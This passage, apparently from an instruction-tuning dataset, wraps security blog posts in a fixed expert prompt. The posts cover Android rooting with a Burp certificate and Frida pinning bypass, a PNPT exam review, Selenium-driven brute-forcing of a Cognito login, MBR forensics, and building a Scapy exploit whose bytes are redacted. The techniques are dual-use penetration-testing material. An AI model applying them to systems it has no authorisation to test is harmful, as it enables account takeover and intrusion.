24.2 MB s 67108864 bytes in 2.644s Now open the Magisk app and choose Install Then Select and patch a file Then Let's Go You will see install log output and the file will be written to the same directory as the original file Use adb to pull the new file off the phone you can use tab completion the filename will start with magisk_patched adb pull storage self primary Download magisk_patched-25200_VEmzX.img storage self primary Download magisk_patched-2...0 skipped 36.6 MB s 67108864 bytes in 1.748s Now we have a rooted boot.img file ready to write to the bootloader Write the patched image All that's left is to write our patched image to the boot loader Write the image with fastboot Reboot the phone into fastboot mode adb reboot bootloader fastboot flash boot magisk_patched-25200_VEmzX.img Sending 'boot_b 65536 KB OKAY 1.930s Writing 'boot_b OKAY 0.306s Finished Total time 2.459s Verify root When the phone reboots it should now be rooted We can verify this with adb adb shell sunfish su root A warning prompt should appear on the phone Accept this prompt and the process should allow root sunfish id uid 0 root gid 0 root groups 0 root context u r magisk s0 Installing the Burp cert Intercepting requests with Burp breaks the TLS certificate chain Without a root of trust TLS will not work and we cannot dynamically test the app with Burp Export convert the cert Note steps below partially taken from here log.ropnop.com configuring-burp-suite-with-android-nougat First launch Burp Then export the certificate curl urp cert -x localhost 8080 tmp cacert.der Then convert it from DER to PEM format openssl x509 -inform DER -in tmp cacert.der -out tmp cacert.pem Android certs are named using the hash value of the file Rename cacert.pem to this format HASH openssl x509 -inform PEM -subject_hash_old -in tmp cacert.pem head -1 mv tmp cacert.pem tmp HASH.0 Now we are ready to copy the cert to the phone Create a module with MMT On earlier versions of Android we could simply write the cert to the phone at this point and be finished More recent versions of Android use a different partitioning scheme making it more difficult to mount the system partition as writable on a rooted phone Commands like mount -o remount rw system no longer work even as the root user For this reason we will use Magisk Module Template Extended MMT-Ex to write the Burp cert to the phone MMT automates the installation of Magisk modules and we can use it to help install our cert Note The below steps are taken loosely from here ithub.com Zackptg5 MMT-Extended wiki Clone the repo git clone ithub.com Zackptg5 MMT-Extended Now we will create the directory structure that MMT will recreate on the phone when our module is run cd MMT-Extended mkdir -p system etc security rm -rf zygisk rm system placeholder cd system etc security Then copy the existing certs from the phone into this directory so they are not removed when the module is run adb pull system etc security cacerts ...and add the Burp cert cp tmp HASH.0 cacerts The file customize.sh is essentially a setup script for our module For example any filesystem permissions configured here will be matched on the device when the module installs This way we can make sure our new certificate has the same file permissions as the rest of the certs on the phone Modify customize.sh replacing the REPLACE variable on line 36 according to the example in the file cd vim customize.sh Make the following replacements additions in the file follow the examples REPLACE system etc security cacerts set_perm_recursive MODPATH system etc security cacerts 0 0 0755 0644 Zip up the module and push it to the phone zip -9 -r MMT.zip adb push MMT.zip storage self primary Download Install the module in Magisk Before installing the module we need to enable Zygisk Open the Magisk app and hit the settings icon on the top right Toggle on Zygisk run parts of Magisk in the zygote daemon Reboot the phone Open the Magisk app and navigate to Modules Install from storage Choose the zip file and Magisk will install it as a module Reboot the phone again To verify the cert is now trusted navigate to Settings Security Encryption credentials You should have a Portswigger entry Proxying traffic over USB With the Burp cert installed and trusted we can intercept traffic from running apps Make sure adb is running and connected to the phone Then start a reverse proxy which will route a given local port on the phone to a given local port on the host computer Burp listens on 8080 by default so we'll use that adb devices -l List of devices attached 13011JEC204262 device usb 5-1.4 product sunfish model Pixel_4a device sunfish transport_id 1 adb reverse tcp 8080 tcp 8080 8080 Now set the phone's network connection to use local port 8080 Settings Network internet Internet your SSID edit button in the top right App traffic should now route through the Burp listener Bypassing cert pinning Cert pinning is a way to ensure that not only is a host's certificate valid but it is the expected one for that host No other certificate will work even if it is a valid signed trusted cert This is becoming more and more common and presents an extra hurdle for us to get around if we want to proxy and analyze app traffic Tools required Frida tools pip install frida-tools rida.re docs installation nodeJS npm apt install nodejs apt install npm odejs.org en download ocs.npmjs.com downloading-and-installing-node-js-and-npm Runtime Mobile Security RMS npm install -g rms-runtime-mobile-security ithub.com m0bilesecurity RMS-Runtime-Mobile-Security Using RMS RMS is a web interface which uses Frida to provide debugging features manipulation tools at runtime ithub.com m0bilesecurity RMS-Runtime-Mobile-Security Frida uses Google's V8 engine to run JavaScript in a hooked process This enables us to interact with functions and modify their behavior for example changing the return value of TLS checks We can use this to defeat roadblocks such as a broken certificate chain or to bypass cert pinning Install Frida server At this point I experienced the issue discussed here ithub.com frida frida issues 2176 issuecomment-1262135111 So I uninstalled com.google.android.art as shown in the comment sunfish pm path com.google.android.art package data apex active com.android.art 330443060.apex sunfish pm uninstall com.google.android.art Success I then rebooted the phone and I was able to install Frida server This will probably be patched in future versions of Frida I am using 15.2.2 at the time of writing It is important that both the Frida client and server versions match Check which version of Frida client was installed with Frida-tools Download this version of Frida server from the Frida git repo Then unxz the file and push it to the phone frida-ps --version 15.2.2 wget -q ithub.com frida frida releases download 15.2.2 frida-server-15.2.2-android-arm64.xz unxz frida-server-15.2.2-android-arm64.xz adb push frida-server-15.2.2-android-arm64 data local tmp frida-server-15.2.2-android-arm64 1 file pushed 0 skipped 71.0 MB s 47188552 bytes in 0.634s NOTE Each Frida release includes many related tools with builds for various architectures Make sure to get the Frida server for the architecture of the device you are using Now connect to the phone and start Frida server adb shell sunfish cd data local tmp sunfish data local tmp su root sunfish data local tmp chmod 777 frida-server-15.2.2-android-arm64 sunfish data local tmp frida-server-15.2.2-android-arm64 1 14535 Now run frida-ps -U and you should see a list of packages frida-ps -U PID Name 2598 .dataservices 2614 .qtidataservices 10851 Facebook 3687 Google 11718 Magisk 8655 Photos 12474 Settings 1482 adbd 1317 adsprpcd Frida works so we're ready to connect to the agent it with RMS Start RMS The rms command will start the web interface locally on port 5000 rms _________________________________________________________ RMS Runtime Mobile Security Version 1.5.11 by mobilesecurity_ Twitter Profile witter.com mobilesecurity_ _________________________________________________________ Navigate to ocalhost 5000 in a web browser RMS can be used for iOS phones as well so choose the Android option under 'Mobile OS The Facebook Android app has cert pinning so we will use it as an example Set com.facebook.katana under 'Package name RMS can spawn an app with Frida already hooked or it can attach to a running process I have never had much luck with the Attach function so choose Spawn We can give Frida our own JavaScript to run but it comes with a set of default scripts to perform common bypasses Multiple cert pinning bypasses are included in this set I've had good results with ssl_pinning_multi_bypass.js so choose this under 'Load Default Frida Scripts Choose 'Start RMS and the app should open on the phone and traffic should show in the Burp proxy Closing thoughts Hopefully collecting all this information in one place saves someone time in the future Inevitably these steps will become obsolete as Google continues to change the Android OS As of October 2022 this process worked for me Hopefully it works for you Thanks to Lance Pendergrass for some of the techniques and Carrie Roberts for the inspiration guidance Jeff has been in various infosec roles for over a decade including 7 years as a penetration tester and a recent transition to cloud security engineer Thank you for sharing your knowledge with us Jeff"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PNPT: Certification Review</title>\n<taxonomies>Daniel Pizarro, External/Internal, General InfoSec Tips & Tricks, Informational, LLMNR, Password Cracking, Password Spray, Recon, Red Team, Red Team Tools, Web App, Cybersecurity Certification, PNPT</taxonomies>\n<creation_date>Tue, 31 Jan 2023 12:52:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Daniel Pizarro What is the PNPT The Practical Network Penetration Tester PNPT created by TCM Security TCMS is a 5-day ethical hacking certification exam that assesses a pentester's ability to perform an external and internal network penetration test To complete the exam pentesters must Perform reconnaissance to gather intelligence Leverage common web server vulnerabilities to breach the perimeter Leverage Active Directory AD vulnerabilities to move laterally and vertically within the network Compromise the Domain Controller DC Produce a professionally written pentest report Deliver a live report debrief to TCMS assessors PNPT Exam Preparation Tips The PNPT exam follows a series of training courses developed by TCMS and covers a range of methodologies and topics A complete syllabus and exam overview is available on the TCMS website Below are a few exam preparation tips and suggestions As expected tools pivotal to completing the exam include Nmap Burp Suite Nessus Metasploit Impacket scripts hash crackers and other software built into Kali Linux Reconnaissance and Enumeration Reconnaissance and enumeration are essential parts of any penetration test Be patient When performing recon targeting a domain and leveraging a newly compromised operating system be thorough about gathering and pillaging information as one piece of data may be utilized at different portions of the assessment Active Directory Active Directory stores information about objects on the network making the information easy for administrators and users to find and use A comfortable knowledge of AD and common network-based attacks is required to complete the PNPT exam As mentioned numerous tools built into Kali Linux were utilized during the exam Understand what the tools do and how pentesters leverage them to advance their position within an Active Directory environment Windows Credential Storages Windows will store sensitive information in various parts of the operating system Understand how Windows protects data and how pentesters may extract them Windows Account Privileges Windows environments will support different account types with specific user privileges and capabilities Familiarity with the account types and their respective privileges is important e.g standard user local administrator service account domain administrator Understanding the differences and quickly identifying their capabilities will make the exam more navigable As for general tips Only follow rabbit holes for a few hours If something seems too elaborate or complex move on to other avenues The PNPT exam is not a CTF and closely emulates a small real-world AD environment Be patient with escalation points don't overthink Think like an APT and focus on common attacks as seen in PNPT training labs and documented in the MITRE ATT CK Framework When stuck take a step back Reconsider the information discovered previously and other ways pentesters will leverage the data In addition to the PNPT training labs several HackTheBox labs are worth completing before attempting the exam as they cover valuable topics and tool usage Active SMB null authentication Active Directory queries GPO and GPP Bloodhound usage and hash cracking Monteverde ADConnect MSSQL databases Windows post-exploitation and spidering SMB shares Search User reconnaissance Kerbrute usage PFX certificate cracking PowerShell web access AV evasion and Nishang scripts Scrambled Impacket scripts TGT KRB5CCNAME usage LDAP queries SID enumeration via PAC and MSSQLClient usage Reporting The PNPT certification sets itself apart from most offensive certifications by emphasizing the report quality and the post-engagement debrief At BHIS we take pride in the quality of the reports we deliver to clients As a result there's no shortage of excellent content on the BHIS website dedicated to what makes a stellar pentest report ww.blackhillsinfosec.com your-reporting-matters-how-to-improve-pen-test-reporting ww.blackhillsinfosec.com how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports outube.com watch?v bJ4gJVXPAS0 si EnSIkaIECMiOmarE t 2885 Debriefing Upon submitting the report the TCMS team will schedule an on-camera debrief via Zoom to review the Findings documented in the report The debrief is straightforward The TCMS assessor will ask for a photo ID as proof of identity an overview of vulnerabilities discovered during the exam and an explanation of how the domain controller was ultimately compromised At this point focus on creating a narrative tell a story and remember to highlight critical portions of the assessment What vulnerabilities and security misconfigurations did you discover Which tools and techniques did you utilize to exploit vulnerabilities How might a security engineer defend against such attacks in the future Walk the assessor through each crucial vulnerability leveraged during the exam from beginning to end Conclusion As a learning tool the PNPT exam and companion training courses provide enormous value for the price point Unlike other cyber certifications the PNPT did not feel like an unrealistic gamified CTF making it a fantastic resource for anyone interested in gaining well-rounded knowledge of pentesting methodologies and Windows infrastructure Overall it was a fun experience I appreciated the thought behind the attacks required to compromise the domain controller and look forward to exams produced by TCMS in the future"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a Pentest Robot With Selenium IDE</title>\n<taxonomies>External/Internal, How-To, Mobile, Password Spray, Red Team, Sean Verity, Web App</taxonomies>\n<creation_date>Thu, 02 Feb 2023 16:51:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sean Verity Have you ever been on a pentest and thought to yourself I wish I had a robot to do this testing for me right now cuz this is just too much work I know I have That's how I came to use the QA tool Selenium IDE to automate things like Brute forcing complicated authentication protocols See Amazon Cognito's implementation of Secure Remote Password for example Password spraying services where tooling is not available and there's not enough time and or willpower to figure out how to configure a Burp Suite Intruder attack with complicated CSRF mitigations Harvesting email addresses from organizations websites when they are dynamically rendered i.e nothing to grep from the HTML source Working around Google reCAPTCHA Selenium IDE automation can help with the transparent sort of reCAPTCHA where a JavaScript challenge needs to be solved not the annoying Click all the panda bears in this grid type of challenge Before we get started though I want to point out that the demo to be presented in this blog was atypical insofar as there were some unique challenges presented with this particular app My goal with this blog is to provide you with a reference for ideas on how to troubleshoot when your Selenium IDE tests aren't working It is typically much easier to automate your browser with Selenium IDE To show you how to build a pentest robot with Selenium IDE we'll take a look at how to brute force an example React app that I put together The example app was built by following this excellent blog Build an Authentication System with AWS Amplify Cognito and React The app uses Amazon Cognito's SRP for authentication which as we'll see is just about impossible to automate with Burp Suite's Intruder module According to Wikipedia SRP is an augmented password-authenticated key exchange PAKE protocol where the password never leaves the client 1 That second phrase already sounds like a deal breaker for running a Burp Intruder attack Usually when using Burp Intruder for authentication attacks you need to mark the password position in the HTTP request If the password never leaves the client though i.e password is not sent in HTTP request how can you mark the password position Here's what the login form looked like for my React app during authentication Requests were sent to cognito-idp.us-east-2.amazonaws.com after clicking the Sign In button As can be seen in the following screenshot the username was pretty easy to spot The password not so much It seems that Wikipedia was right about the password not leaving the client Since using Burp Intruder won't work for brute forcing this login form I considered writing a Burp extension that implemented SRP Before going down that rabbit hole though I took a peek at what would need to be implemented The screenshot below was taken from a Stanford University webpage that describes the SRP Protocol Design Prime modulo salt exponentiation you say It would probably be easier to build a robot that would do this brute force testing for me Ok so maybe the robot idea isn't actually feasible either But what if there was a tool that was easy to install and easy to configure most of the time that would automatically fill in the login form fields and click the Sign In button Ah but there is such a tool And its name is Selenium IDE SIDE To find and install SIDE you can search your browser's extension store or favorite search engine for selenium ide After installing SIDE there's some preliminary things to do like naming the project and setting the base URL The base URL is where you want SIDE to start the test from In the same window where you enter the base URL there will be a button titled Start Recording This will open a new browser instance with a bubble at the bottom of the window that says Selenium IDE is recording Since I'm going to be brute forcing the login form I just need to fill out the login form and click the Sign In button like a typical user After logging in I'm redirected to a very basic dashboard which indicates that I've authenticated All that I needed to record was the login process so I clicked the stop recording button and named the test At this point the next step is to verify that the login process was recorded successfully by clicking the Play button There are a couple of Play buttons in the UI The one on the left will play back all of the tests inside of a project whereas the one on the right will only play back the selected test Since there is only one test at this point either button would work After I clicked the Play button SIDE ran the test and the log indicated that the test completed successfully However the browser was still on the login page as opposed to the dashboard after the login form was submitted While watching the test run there was no data being entered into either form field After much blood sweat and tears were shed while putting together this demo I learned that the problem lay in SIDE's inability to find elements inside of a shadow DOM 2 Shadow DOM is basically a DOM that is nested inside of a DOM which sounds to me like a recipe for use-after-free bugs but that's another topic and I'm sure there are really good reasons why shadow DOM exists but I digress Since both form fields lived in shadow DOMs I had to try a different approach to populating the form fields SIDE has an execute script command which will execute JavaScript inside of the DOM where your test is running We can use this command to select and populate the form fields Now before we go and start rage coding JavaScript inside the SIDE UI like a crazy person let's take a step back and make sure that the JavaScript is sound using the JavaScript console in 00DevTools I decided to start with a simple task of writing a line of JavaScript that would select the username field and populate it with an arbitrary username The first thing to figure out is how to access the username field Usually you can use something like the document.getElementById 3 method and pass the ID of the targeted element In this case it appeared that the username form field ID was username It also looked like there was an event handler for input events attached to it If my assumptions were correct then calling document.getElementById username would return the string abcdef Let's test this theory out in the console tab Ugh Looks like I need to dig a little deeper to come up with a way to select this form field Not that we didn't already know that since I mentioned the shadow DOM issue earlier If we take another look at where the username form field is located we can see that it's inside of a shadow DOM which is nested inside of another shadow DOM that is nested inside of the DOM Easy peasy yeah The other thing to take note of here is that there aren't a whole lot of element IDs to traverse in the shadow DOMs which means that we can't use getElementById to traverse the shadow DOMs No big deal though We can use the document.querySelector 4 method instead To select the username form field we're going to Select the element right before the first shadow DOM root with querySelector Select the shadowRoot property Select the element right before the second shadow DOM root Select the shadowRoot property At this point we'll be inside of the second shadow DOM so we can use getElementById username to select the username field Here's what all of that looks like in the console Now that we have some working JavaScript to get the username form field value we just need to make a minor tweak to set the username value The other piece that needs to be accounted for is the event handler that I highlighted earlier This piece isn't so bad though We can use the same form field selector code then call dispatchEvent 5 method on it to send the input event Here's what the JavaScript looks like in the console tab At this point we have all of the JavaScript needed to select and populate the username form field The next step is to use the same techniques to populate the password field and call the click method on the Sign In button Here's what the final JavaScript looked like Each line of JavaScript can be copied into a SIDE execute script command BTW I deleted all the click commands from the original test since they weren't doing anything useful Here's what the final SIDE test to login looked like To make sure this works let's click the Play button If all goes according to plan the new SIDE test will login to the app and stop at the dashboard It worked Now that we have the login piece automated we need the SIDE test to loop through a list of passwords for brute forcing We'll use a little bit of JavaScript to create an array of passwords SIDE's return keyword to access the array and SIDE's for each command to iterate through the array To start right click on the first command inside of SIDE to insert a new command before the login process This first command will return an array of passwords to SIDE named passwordList Next I'll add for each and end commands to loop through the passwordList array The array name will go in the Target field and the iterator name will go in the Value field of the for each command The end command is also needed at the very end of the test to close the loop The last step is to remove the hard-coded password from the command that populates the password form field and replace it with the iterator variable The syntax for accessing SIDE variables is variable One other change that I'm going to make to this test is adding a three second delay after each login attempt with the pause command The duration is entered in milliseconds SIDE warned me that Hard coded sleeps are old hat but we know better so I clicked on the OK button The delay gives the app enough time to process the login request On a SIDE note when troubleshooting a SIDE test that fails to execute my first move is to add a delay I've found this to be pretty effective most of the time Here's what the final SIDE test looked like to brute force the app At a mere ten lines of code that's not too bad eh I hope you're not too disappointed that I didn't show you how to build a robot but hopefully you came up with some ideas on how you could use Selenium IDE on your next pentest or red team assessment when you're short on time or tooling References 1 n.wikipedia.org wiki Secure_Remote_Password_protocol 2 lazkov.com 2011 01 14 what-the-heck-is-shadow-dom text Shadow 20DOM 20refers 20to 20the the 20main 20document 20DOM 20tree 3 eveloper.mozilla.org en-US docs Web API Document getElementById 4 eveloper.mozilla.org en-US docs Web API Document querySelector 5 eveloper.mozilla.org en-US docs Web API EventTarget dispatchEvent"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Who's Bootin'? Dissecting the Master Boot Record</title>\n<taxonomies>Blue Team, DFIR, General InfoSec Tips & Tricks, Hal Denton, How-To, Informational, Digital Forensics and Incident Response, Master Boot Record</taxonomies>\n<creation_date>Tue, 07 Feb 2023 16:36:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hal Denton Have you ever been given an encrypted hard drive to perform forensic analysis on What could go wrong Probably the first thought rolling through your mind is wondering if the decryption key was included with the drive If so you are spot on in questioning that as the analysis would be pretty much undoable without the decryption key What if you have the decryption key but your forensic software doesn't prompt you for the challenge response to decrypt the drive What do you do next In this blog I will be talking about a scenario where things went wrong with what was supposed to be an acquisition of an encrypted full disk image but I received an encrypted volume At the end of this post you should understand the Master Boot Record MBR and how to manipulate it As a forensic practitioner sometimes we need to dig in and figure out how things work Before we get started one core term you will need to know what is a sector on a hard drive A sector is the smallest storage unit on disk and typically 512 bytes in size it could also be bigger depending on the capacity of the drive Additionally you will need to know common sector address types such as Cylinder Head Sector CHS and Logical Block Address LBA CHS uses disk geometry to map sectors to a head and cylinder number per platter which requires a translation from the OS to BIOS to find the data on disk CHS does not work on disks larger than 8.1GB A predecessor to CHS is LBA and it assigns sequential addresses to each sector which eliminates the need to do a translation The Operating System tells BIOS the address for where to find it on disk LBA works on disks as large a 2TB due to the limitation of the MBR 32bit addressing Master Boot Record MBR Summary The MBR is assembly code that is 512 bytes in length and is located at sector 0 on a hard drive Below is an example of an MBR viewed in a hex editor that I will be using to breakdown the 3 data structures that make up the MBR To help understand the hex editor view the one I am using displays data into 3 columns as labeled below Column 1 tells you the byte offset of the first byte in the row For example if I wanted to manually check what the value is at byte offset 450 I can use column 1 to find the closest offset to 450 which is 448 value 21 below and count to the right two bytes value 07 Column 2 shows the hex values of the data that was loaded into the hex editor and column 3 shows the ASCII character conversion of the hex values MBR Data Structure Overview The 3 data structures that make up the MBR is boot code partition data and the end of MBR signature I will break down each structure by byte range and byte length so you will have a general understanding of each To validate our MBR by math the total byte size should be 512 bytes 446 16 16 16 16 2 512 bytes MBR Boot Code Summary Boot code holds instructions to tell the computer how to process the partition tables and locate the operating system MBR Partition Information Summary Partitions are 16 bytes in length and hold up to four standard partitions for drives with 512 byte sectors There can be more than 4 partitions by using an extended partition A type field identifies what type of data should exist such as FAT NTFS etc Below shows where all 4 partitions are in the MBR and identifies each one MBR 1st Partition MBR 2nd Partition MBR 3rd Partition MBR 4th Partition MBR End of MBR Signature At the end of the MBR is 55 AA You can think of this as a footer of the MBR The footer typically signifies the end of the structure Some file structures have headers and footers to identify the beginning and end of the structure For an example you can reference JPEG's file structure to see the header SOI and footer EOI Now that you have a general understanding of the MBR data structures let's break down the partition information even more so we know how to manipulate it I will break down partition 1 and 2 below to help you grasp what the bytes mean by including a table of the bytes that make up their partition information Partitions 3 and 4 are null 00 or blank which means the MBR only has two partitions partition 1 and 2 MBR 1st Partition Explained When reading the MBR remember this is assembly code and needs to be read from right to left To help with the conversion I read from byte 461 to byte 446 from right-to-left and write down left-to-right Additionally if you decide to use the table below fill in the partition data from bottom-to-top starting with the size in sectors Convert addresses from hex to decimal to identify starting sector and size of the partition Yep just like in school let's pull out those TI's your OS calculator or online converter cough CyberChef cough to make the conversion Below is a screenshot of the Windows calculator changed to programmer mode When you enter the hex values it will be converted to decimal for you MBR 2nd Partition Explained Repeat the same process as in breaking down the 1st partition but read from byte 477 to byte 462 from right-to-left but write down left-to-right Putting it all together now Now that I understood how the MBR works I created a 512 byte MBR file and modified partition 1 information for the LBA start address to be at sector 1 To accomplish that I had to convert 1 decimal into hex 0001 but also put in reverse order 1000 so the LBA address could be properly read Then I appended the acquired image to my synthetic MBR file I proceeded to add the new image to the forensics tool and badda bing badda boom received my challenge and response prompt to decrypt the drive Tools Partition identification validation The Sleuth Kit TSK utility called mmls can identify partition information including start and end locations and length of each partition Partition data manipulation A hex editor can be used to view raw contents of a drive or make modifications Several are available that are open source or have free trials Linux Bless hexyl Windows 010 Editor Notepad References File System Forensic Analysis by Brian Carrier ww.amazon.com System-Forensic-Analysis-Brian-Carrier dp 0321268172 Master Boot Record ww.researchgate.net publication 300373786_Analyzing_Master_Boot_Record_for_Forensic_Investigations JPEG file structure n.wikipedia.org wiki JPEG Syntax_and_structure The Sleuth Kit leuthkit.org Bless Hex Editor ithub.com afrantzis bless Hexyl Hex Editor ithub.com sharkdp hexyl 010 Editor ww.sweetscape.com 010editor Notepad Hex Editor otepad-plus-plus.org"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Exploit Development - A Sincere Form of Flattery</title>\n<taxonomies>Informational, moth, Exploit Development, Python, Scapy, TCPDump, Vulnerability, Wireshark</taxonomies>\n<creation_date>Thu, 09 Feb 2023 18:31:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "moth Recently BHIS penetration tester Dale Hobbs was on an Internal Network Penetration Test and came across an RPC-based arbitrary command execution vulnerability in his vulnerability scan results Nessus Plugin ID 59642 I had mentioned in passing that I was working on learning more about remote procedure calls and Dale invited me to take a look at this vulnerability with him an invitation that I happily accepted Quick disclaimer before the party starts All credit to the initial disclosure of this vulnerability goes to Ron Bowes and Tenable Even though this vulnerability is 10 years old at this point this blog post will unfortunately not be accompanied by exploit code in order to protect Tenable's intellectual property rights For the same reason specific exploit bytes are also redacted in cases where they were taken directly from packet captures While I would love to eventually release the exploit code to the public for the benefit of other information security practitioners this blog post instead focuses on the process of creating and more importantly troubleshooting exploit development With all of that out of the way it's party time Vulnerability Details Let's start this adventure by looking at what Nessus has to say about this vulnerability Nessus Plugin ID 59642 details that the vulnerability allows privileged command execution through an unauthenticated RPC interface Vulnerability Details Sounds relatively simple but I've been burnt by assumptions of simplicity countless times before this Before getting too eager let's take a look at what other information is available regarding the vulnerability The upSploit URL in the references section looks promising so let's go there first and Unable to Browse to upSploit.com Oh Ok maybe the Internet Archive has a reference to it Plugging in the URL there turned out to be a single copy of the page saved in 2013 Archive Search Results for Vulnerability Disclosure Well let's take a look and see what we're working with According to the archived article a typical exploit connection looks something like the following Select the vulnerable interface unidata72 Authenticate opcode 0x04 Perform operations such as running OS commands opcode 0x06 Alright that's a start but it'd be really cool to see how Nessus is exploiting this vulnerability According to Tenable there are no known exploits available for the vulnerability No Known Exploits Available Maybe looking at their script source code will give some insights as can often be done for other findings during a test Looking at the plugin file name will show us where to look and Nessus Script Filename Ah Uncool From what I've read an nbin file is a compiled Nessus file format that allows vendors to provide proof-of-concept code without disclosing the technical details to everybody A good idea but frustrating to run into while testing Clearly Nessus has some secret sauce going on because the vulnerability scan shows that the ipconfig Windows command was successfully executed and the output was received Vulnerability Exploited by Nessus So here's the million-dollar question How can we figure out what an nbin file is doing if we can't see the source code After mulling this over Dale had an idea that led us down the road to our eventual destination of having a working exploit Monkey See Pcaps of Nessus Dale was able to configure his vulnerability scanner to just run the specific plugin He began a packet capture pcap ran the limited vulnerability scan and then sent the resulting pcap file over to me so we could both look at the results With the pcap in hand we were then able to toss it into Wireshark and take a look at the relevant stream by searching for ipconfig in the packet bytes The relevant TCP stream is shown below IP addresses have been redacted In the case where the last octet is shown .32 represents the testing host and .74 represents the target host TCP Stream Intercepted from Nessus By following the TCP stream in Wireshark another window is opened to display an ASCII view of the relevant conversation TCP Stream ASCII Now that we've taken a look at the ASCII representation of the TCP stream let's switch the output to Raw to see what bytes are being sent to the server TCP Stream Raw The two heavily redacted lines in red are sent from the client to the server and that's what we'll be referencing in order to start crafting our own exploit But first it's maybe best for us to analyze the communication a bit closer The following diagram shows an annotated look at what we saw while listening to the conversation TCP Stream Sequence Diagram With a better understanding of the vulnerability and with the packet capture serving as a model of successful exploitation it's time to start writing our own exploit Monkey Do Exploit Construction and Troubleshooting After an unsuccessful but mercifully brief attempt at writing the exploit in C I was convinced by fellow BHIS penetration tester David Fletcher to switch to Python and Scapy After some time getting reacquainted with Scapy it was time to start building in earnest The first step was to build all of the necessary packets sent by the client My first naive attempt of using Scapy to build the exploit predictably went poorly and was not made easier by the fact that I did not initially have access to directly experiment with the vulnerable system Instead I relied on a simple HTTP server running on a machine I controlled just to get the conversation structure set up properly before running it live against the target According to Wireshark it looks like a few things went wrong all at the same time Oops All Errors By adding some debugging output to the exploit to print the sequence and acknowledgement numbers we can see that the numbers aren't being updated properly as the acknowledgement number is supposed to be changing Exploit Debugging Output At this point it was getting to be early evening on Friday and I was feeling like giving up as our time frame to work on this vulnerability was quickly coming to a close I got up for a walk to clear my head I spent the first few minutes of my walk messaging David about some of the issues I was encountering and he graciously gave me some good pointers Clearly my sequence and acknowledgement numbers weren't adding up and we discussed the required update logic until I finally had a rough understanding of what needed changing By the time I got back from my walk I was convinced that we needed to see this through and so we did I woke up the next afternoon and got on my computer to start looking at what exactly was wrong with my sequence and acknowledgement numbers After tweaking the relevant number update logic I checked Wireshark again and observed that the behavior seemed a bit better First Fix of Sequence and Acknowledgement Numbers That said I was still seeing a lot of Destination unreachable Communication administratively filtered in Wireshark which confused me On a virtual machine I instead observed reset packets sent from the client to the server in response to every packet received All Packets Reset in Virtual Machine So what's going on here It turns out that Scapy's troubleshooting documentation has a note on this very issue The issue boils down to the client operating system responding to packets with a reset because the conversation did not originate from the client operating system directly The Scapy documentation notes that the issue can be circumvented with an iptables command iptables -I OUTPUT -d xxx.xxx.xxx.74 -j DROP From my and David's understanding the firewall rule is necessary to prevent our host from killing a connection when it sees packets in conversations that didn't originate from the OS's own network stack The OS sees the response packets from the server and sends resets because the OS isn't aware that Scapy is the one handling the conversation With the firewall rule in place I was able to verify that packets were being sent and received properly from my virtual machine to my test server The following screenshot shows the closest I could get in testing to verify functionality without having Dale test it in his client's environment Final Local Test I sent the latest exploit to Dale and had him run it From the looks of the resulting pcap file we can see that we're about halfway there From the errors it looked like the sequence and acknowledgement numbers were still slightly incorrect First Half of Exploit Working The issue was fixed by removing an erroneous 1 from the else block shown below The following screenshot shows the final sequence acknowledgement number update function Final Fix of Sequence and Acknowledgement Number Update Logic After sending Dale the modified exploit I logged off for the day to enjoy the rest of my Saturday I woke up the next morning to an unexpected message from Dale The exploit had worked After some celebration my eyes were drawn to the end of the resulting output shown below First Exploit Success ...Where's the rest of our command output The exploit performed by Nessus only had a single response packet containing all of the command output Dale provided another pcap and we were able to see that the command output response was being split into two packets The missing command output was contained within the second of two packets highlighted in the following screenshot Command Output Fragmented Talking again with David he noted that the packet options were likely incorrect This prompted me to take a look at the packet options used by Nessus Packet Options from Nessus Exploit From what I could see the SYN packet needed to specify a large window size maximum segment size and window scale Doing so was relatively easy by plugging in some Scapy options into the packet Packet Options Updated in Exploit Code While doing that I also took the opportunity to clean up the output and added arbitrary command output support While implementing the ability to specify arbitrary commands I reviewed the padding present in the command packet The original packet observed from Nessus had four bytes of padding This padding is likely to be important but I figured it would be interesting to confirm I removed most of the padding from the packet and observed that the server's response contained no command output as shown in the following screenshot Unsuccessful Exploitation with Invalid Command Padding Looking at the payload length of the second PSH ACK packet sent from the client we can figure out the most likely padding value The payload length is 56 bytes Given that there are four bytes of padding we can safely guess that padding is done to make the payload length to be a multiple of eight bytes because 52 mod 8 is 4 and 52 